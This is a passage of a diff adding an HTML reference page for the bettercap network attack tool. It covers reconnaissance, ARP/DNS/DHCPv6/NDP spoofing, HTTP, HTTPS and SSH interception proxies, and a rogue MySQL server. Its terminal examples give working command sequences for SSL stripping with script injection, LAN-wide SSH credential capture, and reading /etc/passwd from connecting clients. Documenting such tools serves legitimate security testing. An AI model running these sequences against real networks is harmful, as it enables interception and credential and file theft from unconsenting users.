+      <tr><td>can.parse.obd2</td><td>false</td><td>Enable the built-in OBD2 PID decoder.</td></tr>
+      <tr><td>can.filter</td><td></td><td>Boolean expression to restrict which frames are reported.</td></tr>
+    </table></details>
+    <span class="term-label">Terminal — passive sniff with OBD2 decoding</span>
+<pre>set can.device /dev/can0
+set can.parse.obd2 true
+can.recon on</pre>
+  </article>
+
+
+  <!-- ============ IPv4 / IPv6 RECON ============ -->
+  <h2 class="cat">IPv4 / IPv6 recon</h2>
+
+  <article class="mod" id="net-probe">
+    <div class="mod-head"><h3 class="title">net.probe</h3>
+      <p class="lede">Actively probes every IP in the local subnet (mDNS/NBNS/UPnP/WSD) so <code>net.recon</code> has fresh ARP entries to find.</p></div>
+    <table class="cmds"><tr><td>net.probe on / off</td><td>Start/stop active probing.</td></tr></table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>net.probe.mdns / .nbns / .upnp / .wsd</td><td>true</td><td>Enable/disable each discovery protocol.</td></tr>
+      <tr><td>net.probe.throttle</td><td>10</td><td>ms delay between probe packets.</td></tr>
+    </table></details>
+  </article>
+
+  <article class="mod" id="net-recon">
+    <div class="mod-head"><h3 class="title">net.recon</h3>
+      <p class="lede">Periodically reads the OS ARP table to discover and track hosts on the network.</p></div>
+    <table class="cmds">
+      <tr><td>net.recon on / off</td><td>Start/stop host discovery.</td></tr>
+      <tr><td>net.clear</td><td>Clear the discovered-host list.</td></tr>
+      <tr><td>net.show</td><td>Show cached hosts (sorted by IP by default).</td></tr>
+      <tr><td>net.show ADDR1, ADDR2</td><td>Show just these hosts (IP or MAC).</td></tr>
+      <tr><td>net.show.meta ADDR1, ADDR2</td><td>Show collected metadata for hosts (mDNS names, open ports, etc).</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>net.show.sort / .filter / .limit</td><td>ip asc</td><td>Fields: ip, mac, seen, sent, rcvd.</td></tr>
+      <tr><td>net.show.meta</td><td>false</td><td>Always show full metadata in <code>net.show</code>.</td></tr>
+    </table></details>
+  </article>
+
+  <article class="mod" id="zerogod">
+    <div class="mod-head"><h3 class="title">zerogod <span class="badge">new</span></h3>
+      <p class="lede">DNS-SD / mDNS / Bonjour / Zeroconf discovery, cloning, and impersonation. Replays a device's advertised services so clients connect to you instead — printers, AirPlay, IPP, etc.</p></div>
+    <table class="cmds">
+      <tr><td>zerogod.discovery on / off</td><td>Start/stop mDNS service discovery.</td></tr>
+      <tr><td>zerogod.show ADDRESS</td><td>Show services advertised by an IP.</td></tr>
+      <tr><td>zerogod.show-full ADDRESS</td><td>Same, plus the full underlying DNS records.</td></tr>
+      <tr><td>zerogod.save ADDRESS FILE</td><td>Save a device's service set to a YAML file.</td></tr>
+      <tr><td>zerogod.advertise FILE</td><td>Advertise services loaded from a saved YAML file (<code>off</code> to stop).</td></tr>
+      <tr><td>zerogod.impersonate ADDRESS</td><td>Capture and start advertising a live device's services (<code>off</code> to stop).</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>zerogod.advertise.certificate / .key</td><td>~/.bettercap-zerogod.*.pem</td><td>TLS material for advertised TCP services.</td></tr>
+      <tr><td>zerogod.ipp.save_path</td><td>~/.bettercap/zerogod/documents/</td><td>Where documents sent to a fake IPP printer are saved.</td></tr>
+      <tr><td>zerogod.verbose</td><td>false</td><td>Log every mDNS query seen.</td></tr>
+    </table></details>
+    <span class="term-label">Terminal — clone and impersonate a device's services</span>
+<pre>zerogod.discovery on
+zerogod.show 192.168.1.42
+zerogod.impersonate 192.168.1.42</pre>
+  </article>
+
+  <article class="mod" id="net-sniff">
+    <div class="mod-head"><h3 class="title">net.sniff — net.fuzz</h3>
+      <p class="lede">A packet sniffer and fuzzer with BPF and regex filtering, plus application-layer parsing that surfaces plaintext credentials automatically.</p></div>
+    <table class="cmds">
+      <tr><td>net.sniff on / off</td><td>Start/stop sniffing.</td></tr>
+      <tr><td>net.sniff stats</td><td>Print sniffer configuration and running stats.</td></tr>
+      <tr><td>net.fuzz on / off</td><td>Mutate matching packet layers before they're processed/reinjected.</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>net.sniff.filter</td><td>not arp</td><td>BPF filter.</td></tr>
+      <tr><td>net.sniff.regexp</td><td></td><td>Only consider packets whose payload matches this regex.</td></tr>
+      <tr><td>net.sniff.local</td><td>false</td><td>Include traffic to/from this machine.</td></tr>
+      <tr><td>net.sniff.output / .source</td><td></td><td>Write to / read from a pcap file instead of the live interface.</td></tr>
+      <tr><td>net.sniff.verbose</td><td>false</td><td>Stream every parsed packet to events, not just app-layer hits.</td></tr>
+      <tr><td>net.fuzz.layers</td><td>Payload</td><td>Comma-separated gopacket layer types to fuzz.</td></tr>
+      <tr><td>net.fuzz.rate / .ratio</td><td>1.0 / 0.4</td><td>Fraction of packets fuzzed / fraction of bytes mutated per packet.</td></tr>
+    </table></details>
+    <span class="term-label">Terminal — passive local-host credential sniffer</span>
+<pre>set net.sniff.verbose false
+set net.sniff.local true
+net.sniff on</pre>
+  </article>
+
+  <article class="mod" id="syn-scan">
+    <div class="mod-head"><h3 class="title">syn.scan</h3>
+      <p class="lede">A fast SYN port scanner. Results populate each endpoint's <code>tcp-ports</code> metadata, visible via <code>net.show</code> with <code>net.show.meta</code> enabled.</p></div>
+    <table class="cmds">
+      <tr><td>syn.scan RANGE START END</td><td>Scan an IP / CIDR / nmap-style range over a port range.</td></tr>
+      <tr><td>syn.scan stop</td><td>Abort the running scan.</td></tr>
+      <tr><td>syn.scan.progress</td><td>Print current scan progress.</td></tr>
+    </table>
+    <span class="term-label">Terminal</span>
+<pre>syn.scan 192.168.1.0/24 1 10000</pre>
+  </article>
+
+  <article class="mod" id="wol">
+    <div class="mod-head"><h3 class="title">wol</h3>
+      <p class="lede">Sends Wake-on-LAN magic packets.</p></div>
+    <table class="cmds">
+      <tr><td>wol.eth MAC</td><td>Raw Ethernet WOL frame (type 0x0847). Broadcast if MAC omitted.</td></tr>
+      <tr><td>wol.udp MAC</td><td>IPv4 broadcast WOL over UDP port 9. Broadcast if MAC omitted.</td></tr>
+    </table>
+  </article>
+
+
+  <!-- ============ SPOOFERS ============ -->
+  <h2 class="cat">Spoofers (MITM)</h2>
+  <p class="lede">Spoofers redirect traffic through this host; pair them with a proxy below to actually read or modify what passes through.</p>
+
+  <article class="mod" id="arp-spoof">
+    <div class="mod-head"><h3 class="title">arp.spoof</h3>
+      <p class="lede">The classic ARPv4 MITM — poisons target ARP caches with crafted replies.</p></div>
+    <table class="cmds">
+      <tr><td>arp.spoof on</td><td>Start spoofing.</td></tr>
+      <tr><td>arp.ban on</td><td>Spoof in "ban" mode — the target loses connectivity entirely.</td></tr>
+      <tr><td>arp.spoof off / arp.ban off</td><td>Stop and restore ARP caches (unless skip_restore is set).</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>arp.spoof.targets</td><td>&lt;entire subnet&gt;</td><td>MACs / IPs / ranges / aliases to spoof.</td></tr>
+      <tr><td>arp.spoof.spoofed</td><td>&lt;gateway&gt;</td><td>Addresses to impersonate — defaults to the gateway.</td></tr>
+      <tr><td>arp.spoof.whitelist</td><td></td><td>Addresses to never touch.</td></tr>
+      <tr><td>arp.spoof.fullduplex</td><td>false</td><td>Also poison the gateway, not just the target (fails against routers with ARP-spoof protection).</td></tr>
+      <tr><td>arp.spoof.internal</td><td>false</td><td>Also spoof purely local-to-local traffic.</td></tr>
+      <tr><td>arp.spoof.forwarding</td><td>true</td><td>Keep IP forwarding on while spoofing (off = pure traffic analysis, no relay).</td></tr>
+      <tr><td>arp.spoof.interval</td><td>1000</td><td>ms between spoofed broadcasts.</td></tr>
+      <tr><td>arp.spoof.skip_restore</td><td>false</td><td>Don't restore target ARP caches on stop.</td></tr>
+    </table></details>
+    <span class="term-label">Terminal</span>
+<pre>set arp.spoof.targets 192.168.1.2-4; arp.spoof on</pre>
+  </article>
+
+  <article class="mod" id="dhcp6-spoof">
+    <div class="mod-head"><h3 class="title">dhcp6.spoof</h3>
+      <p class="lede">The mitm6-style attack: replies to Windows hosts' DHCPv6 solicitations with a link-local IPv6 address and sets this host as their DNS server. Pair with <code>dns.spoof</code> to actually be useful.</p></div>
+    <table class="cmds"><tr><td>dhcp6.spoof on / off</td><td>Start/stop the DHCPv6 spoofer.</td></tr></table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>dhcp6.spoof.domains</td><td>microsoft.com, google.com, facebook.com, apple.com, twitter.com</td><td>Domains to target.</td></tr>
+    </table></details>
+  </article>
+
+  <article class="mod" id="dns-spoof">
+    <div class="mod-head"><h3 class="title">dns.spoof</h3>
+      <p class="lede">Answers DNS queries with forged responses. Needs <code>arp.spoof</code> or <code>dhcp6.spoof</code> running first to actually receive the queries.</p></div>
+    <table class="cmds"><tr><td>dns.spoof on / off</td><td>Start/stop.</td></tr></table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>dns.spoof.domains</td><td></td><td>Comma-separated domains to spoof.</td></tr>
+      <tr><td>dns.spoof.address</td><td>&lt;iface address&gt;</td><td>IP to resolve matched domains to.</td></tr>
+      <tr><td>dns.spoof.all</td><td>false</td><td>Answer every request seen, not just ones addressed to this host.</td></tr>
+      <tr><td>dns.spoof.hosts</td><td></td><td>Use a hosts-file for many mappings instead of domains/address.</td></tr>
+      <tr><td>dns.spoof.ttl</td><td>1024</td><td>TTL on spoofed replies.</td></tr>
+    </table></details>
+    <span class="term-label">Terminal</span>
+<pre>set dns.spoof.domains example.com
+set dns.spoof.address 1.2.3.4
+dns.spoof on</pre>
+  </article>
+
+  <article class="mod" id="ndp-spoof">
+    <div class="mod-head"><h3 class="title">ndp.spoof</h3>
+      <p class="lede">IPv6 neighbor spoofing via crafted Neighbor/Router Advertisements — the IPv6 analogue of ARP spoofing.</p></div>
+    <table class="cmds">
+      <tr><td>ndp.spoof on</td><td>Start spoofing.</td></tr>
+      <tr><td>ndp.ban on</td><td>Ban mode — target loses connectivity.</td></tr>
+      <tr><td>ndp.spoof off / ndp.ban off</td><td>Stop.</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>ndp.spoof.targets</td><td></td><td>IPv6 victim addresses.</td></tr>
+      <tr><td>ndp.spoof.neighbour</td><td>fe80::1</td><td>Address to spoof in Neighbor Advertisements; clear to disable NAs.</td></tr>
+      <tr><td>ndp.spoof.prefix / .prefix.length</td><td>d00d:: / 64</td><td>Router-advertisement prefix; clear the prefix to disable RAs.</td></tr>
+      <tr><td>ndp.spoof.router_lifetime</td><td>10</td><td>Seconds advertised as router lifetime.</td></tr>
+    </table></details>
+  </article>
+
+
+  <!-- ============ PROXIES ============ -->
+  <h2 class="cat">Proxies</h2>
+
+  <div class="callout" id="proxy-scripting">
+    <h4>Scripting any of the http/https/dns/tcp/ssh proxies</h4>
+    <p>Each one loads an optional JS file (its <code>*.script</code> or <code>*.hostkey</code>-style parameter) implementing hooks like <code>onLoad()</code>, <code>onRequest(req,res)</code> / <code>onResponse(req,res)</code> (HTTP/HTTPS/DNS), <code>onData(from,to,data)</code> (TCP), or <code>onSSHData(sessionID,direction,data)</code> (SSH) — the interpreter is ES5-only (no <code>for/of</code>, typed arrays, or classes). Builtins available inside every script: <code>readFile</code>, <code>writeFile</code>, <code>readDir</code>, <code>fileExists</code>, <code>log()</code>/<code>log_warn()</code>/<code>log_error()</code>, <code>btoa</code>/<code>atob</code>, <code>gzipCompress</code>/<code>gzipDecompress</code>, <code>env()</code> (get/set session vars), <code>run("shell cmd")</code>, <code>loadJSON</code>/<code>saveJSON</code>, and <code>onEvent</code>/<code>removeEventListener</code>/<code>addSessionEvent</code> for hooking the session's own event bus from JS.</p>
+  </div>
+
+  <article class="mod" id="any-proxy">
+    <div class="mod-head"><h3 class="title">any.proxy</h3>
+      <p class="lede">A plain firewall redirection to any external proxy you already run (Burp, mitmproxy, etc) — no bettercap-side logic, just traffic steering.</p></div>
+    <table class="cmds"><tr><td>any.proxy on / off</td><td>Start/stop the redirection.</td></tr></table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>any.proxy.protocol</td><td>TCP</td><td>TCP or UDP.</td></tr>
+      <tr><td>any.proxy.src_port / .src_address</td><td>80 / any</td><td>What to intercept.</td></tr>
+      <tr><td>any.proxy.dst_address / .dst_port</td><td>&lt;iface addr&gt; / 8080</td><td>Where your external proxy listens.</td></tr>
+      <tr><td>any.proxy.iface</td><td>&lt;iface name&gt;</td><td>Interface to redirect from.</td></tr>
+    </table></details>
+    <span class="term-label">Terminal — send HTTP to a local Burp instance</span>
+<pre>set any.proxy.dst_address 127.0.0.1
+any.proxy on</pre>
+  </article>
+
+  <article class="mod" id="dns-proxy">
+    <div class="mod-head"><h3 class="title">dns.proxy <span class="badge">new</span></h3>
+      <p class="lede">A full, scriptable DNS proxy — UDP, TCP, and TCP-TLS — for real-time manipulation of DNS traffic beyond what <code>dns.spoof</code>'s static mappings allow.</p></div>
+    <table class="cmds"><tr><td>dns.proxy on / off</td><td>Start/stop.</td></tr></table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>dns.proxy.protocol</td><td>udp</td><td>udp / tcp / tcp-tls.</td></tr>
+      <tr><td>dns.proxy.nameserver</td><td>1.1.1.1</td><td>Upstream resolver.</td></tr>
+      <tr><td>dns.proxy.address / .port</td><td>&lt;iface addr&gt; / 8053</td><td>Bind settings.</td></tr>
+      <tr><td>dns.proxy.certificate / .key</td><td>~/.bettercap-ca.*.pem</td><td>TLS material for tcp-tls mode.</td></tr>
+      <tr><td>dns.proxy.blacklist / .whitelist</td><td></td><td>Client-IP filters (wildcards ok).</td></tr>
+      <tr><td>dns.proxy.script</td><td></td><td>JS hook file — see the scripting note above.</td></tr>
+    </table></details>
+  </article>
+
+  <article class="mod" id="http-proxy">
+    <div class="mod-head"><h3 class="title">http.proxy</h3>
+      <p class="lede">A transparent, scriptable HTTP proxy. When a spoofer is active, port redirection to this proxy is handled automatically.</p></div>
+    <table class="cmds"><tr><td>http.proxy on / off</td><td>Start/stop.</td></tr></table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>http.proxy.port / .address</td><td>8080 / &lt;iface addr&gt;</td><td>Bind settings.</td></tr>
+      <tr><td>http.port</td><td>80</td><td>Port redirected into the proxy.</td></tr>
+      <tr><td>http.proxy.sslstrip</td><td>false</td><td>Downgrade HTTPS links to HTTP where possible.</td></tr>
+      <tr><td>http.proxy.injectjs</td><td></td><td>URL, path, or raw JS to inject into every HTML page.</td></tr>
+      <tr><td>http.proxy.blacklist / .whitelist</td><td></td><td>Hostname filters (wildcards ok).</td></tr>
+      <tr><td>http.proxy.script</td><td></td><td>JS hook file.</td></tr>
+    </table></details>
+    <span class="term-label">Terminal — ARP spoof + SSL strip + JS inject</span>
+<pre>set http.proxy.injectjs alert("Hello World")
+set http.proxy.sslstrip true
+http.proxy on
+arp.spoof on</pre>
+  </article>
+
+  <article class="mod" id="https-proxy">
+    <div class="mod-head"><h3 class="title">https.proxy</h3>
+      <p class="lede">Same idea as <code>http.proxy</code> for TLS traffic: fetches the real certificate, re-signs the chain on the fly with bettercap's own CA, and hands clients the forged cert — they'll see a trust warning unless that CA is pre-installed.</p></div>
+    <table class="cmds"><tr><td>https.proxy on / off</td><td>Start/stop.</td></tr></table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>https.proxy.port / .address</td><td>8083 / &lt;iface addr&gt;</td><td>Bind settings.</td></tr>
+      <tr><td>https.port</td><td>443</td><td>Port redirected into the proxy.</td></tr>
+      <tr><td>https.proxy.certificate / .key</td><td>~/.bettercap-ca.*.pem</td><td>The forging CA's cert/key (auto-generated).</td></tr>
+      <tr><td>https.proxy.sslstrip / .injectjs</td><td>false / —</td><td>Same as http.proxy.</td></tr>
+      <tr><td>https.proxy.blacklist / .whitelist / .script</td><td></td><td>Same as http.proxy.</td></tr>
+    </table></details>
+  </article>
+
+  <article class="mod" id="packet-proxy">
+    <div class="mod-head"><h3 class="title">packet.proxy <span class="badge platform">Linux only</span></h3>
+      <p class="lede">NFQUEUE-based raw packet filtering through compiled Go plugins — the lowest-level, highest-effort hook point, for custom filtering logic that JS can't express efficiently.</p></div>
+    <table class="cmds"><tr><td>packet.proxy on / off</td><td>Start/stop the NFQUEUE hook.</td></tr></table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>packet.proxy.plugin</td><td></td><td><strong>Mandatory.</strong> Path to a compiled Go plugin (<code>.so</code>) exporting <code>OnPacket</code>.</td></tr>
+      <tr><td>packet.proxy.queue.num</td><td>0</td><td>NFQUEUE number to bind.</td></tr>
+      <tr><td>packet.proxy.chain</td><td>OUTPUT</td><td>iptables chain to hook.</td></tr>
+      <tr><td>packet.proxy.rule</td><td></td><td>Extra iptables match to narrow the queue, e.g. <code>--destination 8.8.8.8</code>.</td></tr>
+    </table></details>
+    <span class="term-label">Terminal — build and point at a plugin</span>
+<pre>go build -buildmode=plugin test.go
+set packet.proxy.plugin ./test.so
+packet.proxy on</pre>
+  </article>
+
+  <article class="mod" id="ssh-proxy">
+    <div class="mod-head"><h3 class="title">ssh.proxy <span class="badge">new</span></h3>
+      <p class="lede">An SSH MITM proxy: presents its own host key to the client, captures password and public-key auth attempts in the clear, logs session I/O, and forwards transparently to the real server.</p></div>
+    <table class="cmds"><tr><td>ssh.proxy on / off</td><td>Start/stop.</td></tr></table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>ssh.proxy.port / .address</td><td>2222 / &lt;iface addr&gt;</td><td>Bind settings.</td></tr>
+      <tr><td>ssh.port</td><td>22</td><td>Remote SSH port intercepted.</td></tr>
+      <tr><td>ssh.address</td><td></td><td>Real destination. Leave empty to auto-detect per-connection (Linux: <code>SO_ORIGINAL_DST</code>; macOS: <code>pf</code> state table).</td></tr>
+      <tr><td>ssh.proxy.hostkey</td><td></td><td>PEM private key to present; auto-generated (ephemeral ECDSA P-256) if empty.</td></tr>
+      <tr><td>ssh.proxy.script</td><td></td><td>JS hook file (<code>onSSHData</code>).</td></tr>
+    </table></details>
+    <span class="term-label">Terminal — full-duplex ARP spoof + SSH MITM for the whole LAN</span>
+<pre>set arp.spoof.fullduplex true
+set ssh.port       22
+set ssh.proxy.port 2222
+ssh.proxy on
+arp.spoof on</pre>
+    <p class="lede" style="margin-top:-8px;">A ready-made <code>sshproxy.cap</code> caplet ships with bettercap and chains every spoofer and proxy above into one full IPv4+IPv6 MITM run.</p>
+  </article>
+
+  <article class="mod" id="tcp-proxy">
+    <div class="mod-head"><h3 class="title">tcp.proxy</h3>
+      <p class="lede">A generic scriptable TCP proxy — point it at any TCP service and optionally tunnel it elsewhere.</p></div>
+    <table class="cmds"><tr><td>tcp.proxy on / off</td><td>Start/stop.</td></tr></table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>tcp.address</td><td></td><td><strong>Mandatory.</strong> Remote address being proxied.</td></tr>
+      <tr><td>tcp.port</td><td>443</td><td>Port redirected into the proxy.</td></tr>
+      <tr><td>tcp.proxy.port / .address</td><td>8443 / &lt;iface addr&gt;</td><td>Bind settings.</td></tr>
+      <tr><td>tcp.tunnel.address / .port</td><td></td><td>Optional: redirect tcp.address traffic to this address/port instead.</td></tr>
+      <tr><td>tcp.proxy.script</td><td></td><td>JS hook file (<code>onData</code>).</td></tr>
+    </table></details>
+    <span class="term-label">Terminal — tunnel a target's MySQL port to the rogue mysql.server below</span>
+<pre>set arp.spoof.targets 192.168.1.236
+set mysql.server.address 127.0.0.1; set mysql.server.port 3306
+set mysql.server.infile /etc/passwd
+mysql.server on
+set tcp.address 93.184.216.34; set tcp.port 3306
+set tcp.tunnel.address 127.0.0.1; set tcp.tunnel.port 3306
+tcp.proxy on; arp.spoof on</pre>
+  </article>
+
+
+  <!-- ============ SERVERS ============ -->
+  <h2 class="cat">Rogue servers</h2>
+
+  <article class="mod" id="http-server">
+    <div class="mod-head"><h3 class="title">http.server</h3>
+      <p class="lede">A plain file-serving HTTP server for the lab network — payload hosting, fake capture pages, etc.</p></div>
+    <table class="cmds"><tr><td>http.server on / off</td><td>Start/stop.</td></tr></table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>http.server.path</td><td>.</td><td>Folder to serve.</td></tr>
+      <tr><td>http.server.address / .port</td><td>&lt;iface addr&gt; / 80</td><td>Bind settings.</td></tr>
+    </table></details>
+  </article>
+
+  <article class="mod" id="https-server">
+    <div class="mod-head"><h3 class="title">https.server</h3>
+      <p class="lede">Same as <code>http.server</code>, over TLS.</p></div>
+    <table class="cmds"><tr><td>https.server on / off</td><td>Start/stop.</td></tr></table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>https.server.path</td><td>.</td><td>Folder to serve.</td></tr>
+      <tr><td>https.server.address / .port</td><td>&lt;iface addr&gt; / 443</td><td>Bind settings.</td></tr>
+      <tr><td>https.server.certificate / .key</td><td>~/.bettercap-https.*.pem</td><td>Auto-generated if missing.</td></tr>
+    </table></details>
+  </article>
+
+  <article class="mod" id="mdns-server">
+    <div class="mod-head"><h3 class="title">mdns.server</h3>
+      <p class="lede">Advertises a custom multicast-DNS service, or spoofs an existing one — the lower-level building block behind <code>zerogod</code>'s impersonation features.</p></div>
+    <table class="cmds"><tr><td>mdns.server on / off</td><td>Start/stop.</td></tr></table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>mdns.server.host / .domain</td><td>&lt;hostname&gt;. / local.</td><td>Advertised hostname and domain.</td></tr>
+      <tr><td>mdns.server.service</td><td>_companion-link._tcp.</td><td>Service type to advertise.</td></tr>
+      <tr><td>mdns.server.port</td><td>52377</td><td>Service port.</td></tr>
+      <tr><td>mdns.server.address / .address6</td><td>&lt;iface addr&gt;</td><td>IPv4 / IPv6 to advertise.</td></tr>
+      <tr><td>mdns.server.info</td><td></td><td>Comma-separated TXT record values.</td></tr>
+    </table></details>
+  </article>
+
+  <article class="mod" id="mysql-server">
+    <div class="mod-head"><h3 class="title">mysql.server <span class="badge">rogue</span></h3>
+      <p class="lede">A fake MySQL server that abuses <code>LOCAL INFILE</code> to read arbitrary files off any client that connects with that option enabled.</p></div>
+    <table class="cmds"><tr><td>mysql.server on / off</td><td>Start/stop.</td></tr></table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>mysql.server.infile</td><td>/etc/passwd</td><td>File to request from connecting clients (UNC paths supported too).</td></tr>
+      <tr><td>mysql.server.outfile</td><td></td><td>Save the read contents here instead of just logging them.</td></tr>
+      <tr><td>mysql.server.address / .port</td><td>&lt;iface addr&gt; / 3306</td><td>Bind settings.</td></tr>
+    </table></details>
+  </article>
+
+
+  <!-- ============ UTILS ============ -->
+  <h2 class="cat">Utils</h2>
+
+  <article class="mod" id="gps">
+    <div class="mod-head"><h3 class="title">gps</h3>
+      <p class="lede">Reads coordinates from any GPS receiver exposed as a serial device — useful for tagging wardriving captures.</p></div>
+    <table class="cmds">
+      <tr><td>gps on / off</td><td>Start/stop acquisition.</td></tr>
+      <tr><td>gps.show</td><td>Print the last known coordinates.</td></tr>
+      <tr><td>gps.set LAT LON</td><td>Manually set a position (e.g. for VMs with no real GPS hardware).</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>gps.device</td><td>/dev/ttyUSB0</td><td>Serial device path.</td></tr>
+      <tr><td>gps.baudrate</td><td>19200</td><td>Serial baud rate.</td></tr>
+    </table></details>
+  </article>
+
+  <article class="mod" id="mac-changer">
+    <div class="mod-head"><h3 class="title">mac.changer</h3>
+      <p class="lede">Changes the interface's hardware address for the duration of the session.</p></div>
+    <table class="cmds">
+      <tr><td>mac.changer on</td><td>Apply the configured MAC (random by default).</td></tr>
+      <tr><td>mac.changer off</td><td>Restore the original MAC.</td></tr>
+    </table>
+    <details class="params"><summary>Parameters</summary>
+    <table class="params">
+      <tr><td>mac.changer.address</td><td>&lt;random&gt;</td><td>MAC to apply.</td></tr>
+      <tr><td>mac.changer.iface</td><td>&lt;iface name&gt;</td><td>Interface to change.</td></tr>
+    </table></details>
+  </article>
+
+
+  <h2 class="cat" id="events-ref">Appendix: event tags</h2>
+  <p class="lede">The tags <code>events.ignore</code>, <code>events.on</code>, and <code>events.waitfor</code> all key on.</p>
+  <table class="cmds">
+    <tr><td>endpoint.new / .lost</td><td>LAN host discovered / dropped off.</td></tr>
+    <tr><td>gateway.change</td><td>IPv4 or IPv6 gateway changed.</td></tr>
+    <tr><td>wifi.ap.new / .lost</td><td>AP discovered / out of range.</td></tr>
+    <tr><td>wifi.client.new / .lost</td><td>Station discovered / disconnected.</td></tr>
+    <tr><td>wifi.client.probe</td><td>Station probing for an ESSID.</td></tr>
+    <tr><td>wifi.client.handshake</td><td>WPA/WPA2 key material captured.</td></tr>
+    <tr><td>wifi.client.deauthentication</td><td>Deauth frame observed.</td></tr>
+    <tr><td>ble.device.new</td><td>New BLE device seen.</td></tr>
+    <tr><td>ble.device.connected</td><td>Connected to a BLE device.</td></tr>
+    <tr><td>ble.device.service.discovered / .characteristic.discovered</td><td>GATT enumeration progress.</td></tr>
+    <tr><td>hid.device.new / .lost</td><td>2.4GHz HID dongle seen / lost.</td></tr>
+    <tr><td>syn.scan</td><td>Open port found.</td></tr>
+    <tr><td>http(s).spoofed-request / -response</td><td>A proxy module altered a request/response.</td></tr>
+    <tr><td>mod.started / .stopped</td><td>A module changed running state.</td></tr>
+    <tr><td>sys.log</td><td>Plain log message.</td></tr>
+    <tr><td>tick</td><td>Fired by the ticker module.</td></tr>
+    <tr><td>update.available</td><td>A newer bettercap release exists.</td></tr>
+    <tr><td>session.started / .closing</td><td>Session lifecycle.</td></tr>
+  </table>
+
+  <footer>
+    <p>Sources: the official module docs at <a href="https://www.bettercap.org/" target="_blank" rel="noopener">bettercap.org</a> and the <a href="https://github.com/bettercap/bettercap" target="_blank" rel="noopener">bettercap/bettercap</a> repository, cross-checked against the <code>bettercap</code> (engine) and <code>bettercap-ui</code> (web UI) package pages on kali.org/tools, current as of October 2026.</p>
+    <p>Static reference file — no telemetry, no external calls. Safe to drop on an isolated lab web server.</p>
+  </footer>
+
+</main>
+</div>
+
+<script>
+(function(){
+  var input = document.getElementById('filter');
+  var mods = Array.prototype.slice.call(document.querySelectorAll('.mod'));
+  var links = Array.prototype.slice.call(document.querySelectorAll('.side-group a'));
+
+  function norm(s){ return (s||'').toLowerCase(); }
+
+  input.addEventListener('input', function(){
+    var q = norm(input.value).trim();
+    mods.forEach(function(mod){
+      var hit = q === '' || norm(mod.textContent).indexOf(q) !== -1;
+      mod.classList.toggle('hidden', !hit);
+    });
+    links.forEach(function(a){
+      var href = a.getAttribute('href');
+      if(!href || href.charAt(0) !== '#') return;
+      var mod = document.querySelector(href);
+      if(!mod || !mod.classList.contains('mod')) return; // leave non-module nav links alone
+      var hit = q === '' || norm(a.textContent).indexOf(q) !== -1 || !mod.classList.contains('hidden');
+      a.classList.toggle('hidden', !hit);
+    });
+  });
+})();
+</script>
+
+</body>
+</html>
